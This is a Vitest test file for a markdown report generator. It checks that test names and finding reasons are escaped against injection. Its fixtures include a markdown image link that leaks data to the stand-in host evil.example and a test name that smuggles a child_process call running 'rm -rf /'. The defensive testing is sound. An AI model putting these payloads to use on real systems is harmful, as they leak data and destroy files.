import type { OrchestratorResult, ScoreResult, Subscores } from '@trash-tests/core'
import { describe, expect, it } from 'vitest'
import { MarkdownReporter } from '../src/MarkdownReporter.js'
import { escapeInlineCode, escapeMd } from '../src/escape.js'

describe('MarkdownReporter — security (XSS prevention)', () => {
  it('escapes malicious test names that try to break inline code', () => {
    const malicious = 'foo` - ![leak](https://evil.example/x.png?pr=leaked)'
    const escaped = escapeInlineCode(malicious)
    // Backticks are replaced with a unicode look-alike so they can't break out
    expect(escaped).not.toContain('`')
  })

  it('escapes markdown special chars in reasons', () => {
    const malicious = '![image](https://evil.example/x.png)'
    const escaped = escapeMd(malicious)
    expect(escaped).toContain('\\!')
    expect(escaped).toContain('\\[')
  })

  it('produces safe markdown for a finding with a malicious test name', () => {
    const maliciousName = "foo`+require('child_process').exec('rm -rf /')+`"
    const subscores: Subscores = {
      assertionQuality: 0,
      branchCoverage: null,
      mutationResistance: null,
      errorPathCoverage: null,
      mockSanity: null,
    }
    const scoreResult: ScoreResult = {
      mtc: 0,
      subscores,
      effectiveWeights: {
        assertionQuality: 1,
        branchCoverage: 0,
        mutationResistance: 0,
        errorPathCoverage: 0,
        mockSanity: 0,
      },
      renormalized: true,
    }
    const result: OrchestratorResult = {
      score: scoreResult,
      findings: [
        {
          ruleId: 'no-assertion',
          severity: 'critical',
          file: 'tests/evil.test.ts',
          line: 1,
          testName: maliciousName,
          reason: 'test with malicious name',
          confidence: 0.9,
          suggestedFix: 'fix it',
        },
      ],
      filesAnalyzed: 1,
      testsAnalyzed: 1,
      stats: { staticMs: 0, mutationMs: 0, totalMs: 0 },
    }
    const md = MarkdownReporter.format(result, { repoRoot: '/tmp' })
    // The malicious backticks in testName should be neutralized (replaced with unicode look-alike ˋ)
    // So the raw malicious pattern should NOT appear in the output
    expect(md).not.toContain("foo`+require('child_process')")
    // The unicode replacement should be present, proving the backticks were escaped
    expect(md).toContain('ˋ')
    // No image markdown that could load external resources
    expect(md).not.toMatch(/!\[.*\]\(https?:\/\//)
  })
})
